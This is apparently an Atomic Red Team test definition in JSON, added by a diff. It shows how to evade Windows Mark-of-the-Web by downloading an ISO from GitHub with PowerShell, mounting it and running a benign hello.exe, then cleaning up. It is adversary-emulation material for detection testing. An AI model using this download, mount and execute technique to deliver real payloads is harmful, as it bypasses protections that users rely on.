@@ -1,0 +1,105 @@
+{
+  "id": "42f22b00-0242-4afc-a61b-0da05041f9cc",
+  "name": "Mount an ISO image and run executable from the ISO",
+  "description": "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  ",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "09a6081e-c59c-4868-922a-1b5f95cdc02d",
+      "type": "execute-command",
+      "data": {
+        "command": "Mount-DiskImage -ImagePath \"#{path_of_iso}\" -StorageType ISO -Access ReadOnly\n$keep = Get-Volume -FileSystemLabel \"TestIso\"\n$driveLetter = ($keep | Get-Volume).DriveLetter\ninvoke-item \"$($driveLetter):\\hello.exe\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ec63dead-7291-4cb5-abf2-e1bb089626c0",
+      "type": "execute-command",
+      "data": {
+        "command": "Dismount-DiskImage -ImagePath \"#{path_of_iso}\" | Out-Null\nStop-process -name \"hello\" -Force -ErrorAction ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1c4c1e7a-53e4-4dfa-9b03-8c561b0d9822",
+      "name": "Check dependency 1/1",
+      "description": "FeelTheBurn.iso must exist on disk at specified location (#{path_of_iso})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{path_of_iso}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1c80afb5-76e6-48e4-8586-36d50f687f68",
+      "name": "Resolve dependency 1/1",
+      "description": "FeelTheBurn.iso must exist on disk at specified location (#{path_of_iso})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{path_of_iso}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/FeelTheBurn.iso -OutFile \"#{path_of_iso}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6c2f7e9c-ae0a-4d00-95be-eb7668e70a76",
+      "name": "Re-check dependency 1/1",
+      "description": "FeelTheBurn.iso must exist on disk at specified location (#{path_of_iso})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{path_of_iso}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "09a6081e-c59c-4868-922a-1b5f95cdc02d",
+      "p": "on-success",
+      "o": "ec63dead-7291-4cb5-abf2-e1bb089626c0"
+    },
+    {
+      "s": "09a6081e-c59c-4868-922a-1b5f95cdc02d",
+      "p": "on-failure",
+      "o": "ec63dead-7291-4cb5-abf2-e1bb089626c0"
+    },
+    {
+      "s": "1c4c1e7a-53e4-4dfa-9b03-8c561b0d9822",
+      "p": "on-success",
+      "o": "09a6081e-c59c-4868-922a-1b5f95cdc02d"
+    },
+    {
+      "s": "1c4c1e7a-53e4-4dfa-9b03-8c561b0d9822",
+      "p": "on-failure",
+      "o": "1c80afb5-76e6-48e4-8586-36d50f687f68"
+    },
+    {
+      "s": "1c80afb5-76e6-48e4-8586-36d50f687f68",
+      "p": "on-success",
+      "o": "6c2f7e9c-ae0a-4d00-95be-eb7668e70a76"
+    },
+    {
+      "s": "6c2f7e9c-ae0a-4d00-95be-eb7668e70a76",
+      "p": "on-failure",
+      "o": "09a6081e-c59c-4868-922a-1b5f95cdc02d"
+    }
+  ],
+  "tags": [
+    "T1553.005",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "path_of_iso",
+      "type": "path",
+      "description": "Path to ISO file",
+      "value": "PathToAtomicsFolder\\T1553.005\\bin\\FeelTheBurn.iso"
+    }
+  ]
+}
